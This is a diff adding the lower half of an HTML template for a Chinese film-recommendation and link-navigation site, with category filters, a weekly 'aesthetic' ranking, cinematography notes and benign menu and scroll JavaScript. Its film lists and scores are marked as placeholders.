+      <div class="pcard"><div class="ava">老</div>
+        <div><span class="chip">◆ 老片修复</span></div>
+        <h4>老片修复馆</h4>
+        <p style="font-size:13px;color:#a99fb4">4K 修复、AI 补帧、胶转数，让经典电影的画面重新美一次。</p>
+        <div class="foot"><span>收录 19 条</span><span class="go">去看看 →</span></div>
+      </div>
+      <div class="pcard"><div class="ava">短</div>
+        <div><span class="chip">◆ 短片</span></div>
+        <h4>十五分钟厅</h4>
+        <p style="font-size:13px;color:#a99fb4">通勤、午休、睡前刚好够用，3—15 分钟的唯美短片。</p>
+        <div class="foot"><span>收录 24 条</span><span class="go">去看看 →</span></div>
+      </div>
+      <div class="pcard"><div class="ava">女</div>
+        <div><span class="chip">◆ 她视角</span></div>
+        <h4>她镜头</h4>
+        <p style="font-size:13px;color:#a99fb4">女性导演、女性成长、女性关系，画面温柔而有力量。</p>
+        <div class="foot"><span>收录 17 条</span><span class="go">去看看 →</span></div>
+      </div>
+      <div class="pcard"><div class="ava">避</div>
+        <div><span class="chip hot">◆ 避雷</span></div>
+        <h4>烂片避雷清单</h4>
+        <p style="font-size:13px;color:#a99fb4">看完会觉得时间被偷走的那些，帮你省下两小时。</p>
+        <div class="foot"><span>收录 22 条</span><span class="go">去看看 →</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= 分类导航（dl 宫格） ================= -->
+<section id="cate">
+  <div class="wrap">
+    <span class="eyebrow">Category · 分类导航</span>
+    <h2 class="sec">七个维度，<b>三步</b>找到那部 <em>唯美电影</em></h2>
+    <p class="sec-sub">题材 × 评分 × 画质 × 年代 × 地区 × 语言 × 时长——唯美电影网的"7×7"筛选法，让"想看一部画面好看的片子"不再是一句空话。</p>
+
+    <div class="cate-grid">
+      <div class="cat"><dt><b>按题材</b><span>收录 42</span></dt>
+        <dd><a href="#">剧情</a><a href="#">文艺</a><a href="#">爱情</a><a href="#">家庭</a><a href="#">青春</a><a href="#">悬疑</a><a href="#">治愈</a><a href="#">公路</a><a href="#">自然</a></dd></div>
+      <div class="cat"><dt><b>按画面</b><span>收录 38</span></dt>
+        <dd><a href="#">唯美画面</a><a href="#">唯美光影</a><a href="#">唯美色调</a><a href="#">长镜头</a><a href="#">构图</a><a href="#">色彩</a><a href="#">胶片感</a><a href="#">自然光</a></dd></div>
+      <div class="cat"><dt><b>按画质</b><span>收录 34</span></dt>
+        <dd><a href="#">4K</a><a href="#">2K</a><a href="#">1080P</a><a href="#">蓝光原盘</a><a href="#">REMUX</a><a href="#">杜比视界</a><a href="#">HDR10+</a><a href="#">60fps</a></dd></div>
+      <div class="cat"><dt><b>按评分</b><span>收录 30</span></dt>
+        <dd><a href="#">9 分殿堂</a><a href="#">8.5 分+</a><a href="#">8 分起</a><a href="#">冷门高分</a><a href="#">口碑逆袭</a><a href="#">三大节</a><a href="#">奥斯卡</a></dd></div>
+      <div class="cat"><dt><b>按年代</b><span>收录 28</span></dt>
+        <dd><a href="#">2025</a><a href="#">2024</a><a href="#">2020s</a><a href="#">2010s</a><a href="#">2000s</a><a href="#">90 年代</a><a href="#">经典老片</a></dd></div>
+      <div class="cat"><dt><b>按地区</b><span>收录 26</span></dt>
+        <dd><a href="#">日本</a><a href="#">韩国</a><a href="#">法国</a><a href="#">意大利</a><a href="#">北欧</a><a href="#">西班牙</a><a href="#">华语</a><a href="#">拉美</a></dd></div>
+      <div class="cat"><dt><b>按片长</b><span>收录 22</span></dt>
+        <dd><a href="#">≤15 分钟</a><a href="#">≤30 分钟</a><a href="#">≤90 分钟</a><a href="#">93 分钟</a><a href="#">≤120 分钟</a><a href="#">≥150 分钟</a></dd></div>
+      <div class="cat"><dt><b>按类型</b><span>收录 20</span></dt>
+        <dd><a href="#">电影</a><a href="#">剧集</a><a href="#">纪录片</a><a href="#">短片</a><a href="#">动画</a><a href="#">独立制片</a><a href="#">修复版</a></dd></div>
+      <div class="cat"><dt><b>按心情</b><span>收录 18</span></dt>
+        <dd><a href="#">安静</a><a href="#">治愈</a><a href="#">想哭</a><a href="#">睡不着</a><a href="#">下雨天</a><a href="#">一个人</a><a href="#">周末</a><a href="#">长途</a></dd></div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= 唯美榜（ol + 进度条） ================= -->
+<section id="hot" style="background:linear-gradient(180deg,rgba(255,92,138,.06),transparent)">
+  <div class="wrap">
+    <span class="eyebrow">Ranking · 唯美榜</span>
+    <h2 class="sec">本周 <em>唯美榜</em>：画面分最高的 <b>十部</b></h2>
+    <p class="sec-sub">"唯美分"由画面构图、光影运用、色彩设计、长镜头运用四项人工打分，与口碑评分并列参考。<b>不是热度榜，是耐看榜</b>。</p>
+
+    <div class="hot-wrap">
+      <ol class="rank">
+        <li class="rk"><div class="tx"><h4>《面包与星期天》 <span class="yr">2022 · 意大利</span></h4>
+          <div class="bar"><i style="--w:98%"></i></div><small>唯美分 9.8 ｜ 胶片暖调，每一帧都能当壁纸</small></div></li>
+        <li class="rk"><div class="tx"><h4>《雨中的信件》 <span class="yr">2024 · 韩国</span></h4>
+          <div class="bar"><i style="--w:95%"></i></div><small>唯美分 9.5 ｜ 雨、玻璃、窗光，三种道具拍出一部电影</small></div></li>
+        <li class="rk"><div class="tx"><h4>《海岛来信》 <span class="yr">2024 · 冰岛</span></h4>
+          <div class="bar"><i style="--w:92%"></i></div><small>唯美分 9.2 ｜ 4K HDR 大屏首选，海面就是主角</small></div></li>
+        <li class="rk"><div class="tx"><h4>《第八日的风》 <span class="yr">2023 · 日本</span></h4>
+          <div class="bar"><i style="--w:88%"></i></div><small>唯美分 8.8 ｜ 黄昏逆光，把日常拍成诗</small></div></li>
+        <li class="rk"><div class="tx"><h4>《循环的第十五天》 <span class="yr">2025 · 西班牙</span></h4>
+          <div class="bar"><i style="--w:84%"></i></div><small>唯美分 8.4 ｜ 全片仅七色，色彩设计封神</small></div></li>
+        <li class="rk"><div class="tx"><h4>《沉默的档案员》 <span class="yr">2021 · 法国</span></h4>
+          <div class="bar"><i style="--w:80%"></i></div><small>唯美分 8.0 ｜ 极简布光，安静到听得见纸</small></div></li>
+        <li class="rk"><div class="tx"><h4>《便利店夜班》 <span class="yr">2023 · 华语</span></h4>
+          <div class="bar"><i style="--w:76%"></i></div><small>唯美分 7.6 ｜ 冷光与热汤，城市深夜的两种温度</small></div></li>
+        <li class="rk"><div class="tx"><h4>《海边的十五级台阶》 <span class="yr">2022 · 希腊</span></h4>
+          <div class="bar"><i style="--w:72%"></i></div><small>唯美分 7.2 ｜ 固定机位，海与台阶构成全部叙事</small></div></li>
+      </ol>
+
+      <aside class="tips">
+        <h5>挑片三条心得</h5>
+        <ul>
+          <li><b style="color:#fff">画面要美</b>：暂停任意一帧都不尴尬，构图与色彩经得起放大。</li>
+          <li><b style="color:#fff">光影要真</b>：优先自然光、实景、长镜头，少用绿幕与特效。</li>
+          <li><b style="color:#fff">情绪要稳</b>：看完心里留点东西，比"爽一下"更重要。</li>
+          <li><b style="color:#fff">画质要够</b>：4K / 蓝光原盘 / REMUX，别让好画面毁在码率上。</li>
+        </ul>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- ================= 挑片笔记（图文条目） ================= -->
+<section id="news">
+  <div class="wrap">
+    <span class="eyebrow">Notes · 挑片笔记</span>
+    <h2 class="sec">为什么我们<b>只看画面</b>也看得懂电影</h2>
+    <p class="sec-sub">挑片笔记不写剧情、不剧透、不追热点，只聊<b>画面、光影、色调、构图、镜头</b>。写给"想看一部好看的片子，但不知道看什么"的你。</p>
+
+    <div class="news-grid">
+      <article class="note"><div class="th"><span>画面</span></div>
+        <div class="tx"><h3>为什么"画面美"本身就是一种叙事</h3>
+          <p>构图决定你看哪里，光影决定你感受什么，色彩决定你记住多久。一部好电影，往往在前三十秒就已经把结局的色调安排好了。</p>
+          <div class="mi"><span>唯美画面</span><span>8 分钟阅读</span><span>更新于 10 月 8 日</span></div></div></article>
+
+      <article class="note"><div class="th"><span>光影</span></div>
+        <div class="tx"><h3>自然光拍摄的十个瞬间，比十场特效更贵</h3>
+          <p>黄昏只有二十分钟，阴天只有一整个上午。愿意等光的导演，通常也愿意等一个好故事。</p>
+          <div class="mi"><span>唯美光影</span><span>6 分钟阅读</span><span>更新于 10 月 5 日</span></div></div></article>
+
+      <article class="note"><div class="th"><span>色调</span></div>
+        <div class="tx"><h3>低饱和不等于高级，但高级往往很低饱和</h3>
+          <p>区分"唯美色调"与"滤镜感"：前者服务情绪，后者掩盖空洞。附 12 部色调教科书级片单。</p>
+          <div class="mi"><span>唯美色调</span><span>9 分钟阅读</span><span>更新于 10 月 1 日</span></div></div></article>
+
+      <article class="note"><div class="th"><span>长镜头</span></div>
+        <div class="tx"><h3>长镜头不是炫技，是对观众的信任</h3>
+          <p>当剪辑退场，表演、调度、美术、声音必须同时成立。盘点近年来最动人的七个 uninterrupted 镜头。</p>
+          <div class="mi"><span>唯美镜头</span><span>7 分钟阅读</span><span>更新于 9 月 26 日</span></div></div></article>
+
+      <article class="note"><div class="th"><span>画质</span></div>
+        <div class="tx"><h3>4K、蓝光原盘、REMUX：别让好画面毁在码率上</h3>
+          <p>画面再美，压成 2Mbps 也只剩色块。一文讲清画质标注、字幕格式与设备匹配，大屏观看必读。</p>
+          <div class="mi"><span>高清影视</span><span>11 分钟阅读</span><span>更新于 9 月 20 日</span></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- ================= 关于本站（流程条） ================= -->
+<section id="about">
+  <div class="wrap">
+    <span class="eyebrow">About · 关于本站</span>
+    <h2 class="sec">关于 <em>唯美电影网</em>：我们<b>只挑，不搬</b></h2>
+    <p class="sec-sub">唯美电影网是一个<b>影视网址导航与片单推荐</b>站点。我们不提供、不存储、不转存任何影视资源文件，只把你值得花两小时的那部电影，从杂乱的网络里挑出来。</p>
+
+    <div class="flow">
+      <div class="step"><div class="n">STEP 01</div><b>选题材</b><p>先想清楚今天想要"画面、光影、色调"里的哪一种美。</p></div>
+      <div class="step"><div class="n">STEP 02</div><b>挑画质</b><p>4K / 蓝光原盘 / REMUX / 杜比视界，别让好画面毁在码率。</p></div>
+      <div class="step"><div class="n">STEP 03</div><b>看口碑</b><p>评分只是门槛，冷门佳作往往藏在评论区的第三页。</p></div>
+      <div class="step"><div class="n">STEP 04</div><b>点开就看</b><p>跳转少、字幕齐、无诱导下载，两分钟内必须能开始看。</p></div>
+    </div>
+
+    <div class="stats2">
+      <div class="stat2"><b>188</b><small>精选片单</small></div>
+      <div class="stat2"><b>96</b><small>精选网址</small></div>
+      <div class="stat2"><b>7×7</b><small>筛选维度</small></div>
+      <div class="stat2"><b>0</b><small>资源文件</small></div>
+      <div class="stat2"><b>0</b><small>诱导下载</small></div>
+      <div class="stat2"><b>每周</b><small>复核更新</small></div>
+    </div>
+
+    <div class="notice">
+      <b style="color:#ffcf6b">合规说明：</b>本页为「唯美电影网（weimeidianyingwang-cn.github.io）」单页网站模板，页面所示片单、画质、码率、字幕、时长、评分均为<b>示例占位</b>，请以实际片源为准。本站仅提供网址导航、片单推荐与观影资讯，<b>不提供任何影视资源下载文件</b>；如涉及侵权内容，请联系我们，将在 24 小时内下架相关链接。请支持正版与院线。
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="ft wrap">
+    <div>
+      <a class="brand" href="#top" style="margin-bottom:12px">
+        <span class="logo" aria-hidden="true"></span>
+        <span><b>唯美电影网</b><small>WEIMEI FILM</small></span>
+      </a>
+      <p>画面要美，故事要真。唯美电影网，专注唯美画面与唯美光影的优质电影导航。</p>
+    </div>
+    <div>
+      <h6>快速导航</h6>
+      <ul><li><a href="#jam">唯美片单</a></li><li><a href="#pick">精选网址</a></li>
+      <li><a href="#cate">分类导航</a></li><li><a href="#hot">唯美榜</a></li><li><a href="#news">挑片笔记</a></li></ul>
+    </div>
+    <div>
+      <h6>热门筛选</h6>
+      <ul><li><a href="#">4K 蓝光</a></li><li><a href="#">杜比视界</a></li><li><a href="#">长镜头</a></li>
+      <li><a href="#">胶片感</a></li><li><a href="#">冷门高分</a></li><li><a href="#">十五分钟厅</a></li></ul>
+    </div>
+    <div>
+      <h6>关于与合规</h6>
+      <ul><li><a href="#about">关于本站</a></li><li><a href="#">片单标准</a></li>
+      <li><a href="#">免责声明</a></li><li><a href="#">侵权下架</a></li><li><a href="#">支持正版</a></li></ul>
+    </div>
+  </div>
+  <div class="wrap copy">
+    <span>© 2026 唯美电影网 · weimeidianyingwang-cn.github.io · 仅作网址导航与片单推荐，不提供影视资源下载</span>
+    <span>页面内容均为示例占位，请以实际片源为准</span>
+  </div>
+</footer>
+
+<a class="top" id="topBtn" href="#top" aria-label="回到顶部">↑</a>
+
+<script>
+(function(){
+  var burger=document.getElementById('burger'), nav=document.getElementById('navLinks');
+  burger.addEventListener('click',function(){
+    nav.classList.toggle('open');
+    burger.classList.toggle('open');
+    burger.setAttribute('aria-expanded', nav.classList.contains('open'));
+  });
+  nav.addEventListener('click',function(e){
+    if(e.target.tagName==='A'){ nav.classList.remove('open'); burger.classList.remove('open'); }
+  });
+
+  var links=Array.prototype.slice.call(document.querySelectorAll('.nav-links a'));
+  var secs=links.map(function(a){ return document.querySelector(a.getAttribute('href')); });
+  function onScroll(){
+    var y=window.scrollY+140, cur=0;
+    secs.forEach(function(s,i){ if(s && s.offsetTop<=y) cur=i; });
+    links.forEach(function(a,i){ a.classList.toggle('on', i===cur); });
+    document.getElementById('topBtn').classList.toggle('show', window.scrollY>700);
+  }
+  window.addEventListener('scroll',onScroll,{passive:true}); onScroll();
+
+  var io=new IntersectionObserver(function(es){
+    es.forEach(function(e){ if(e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target); } });
+  },{threshold:.25});
+  document.querySelectorAll('.rk').forEach(function(r){ io.observe(r); });
+})();
+</script>
+</body>
+</html>
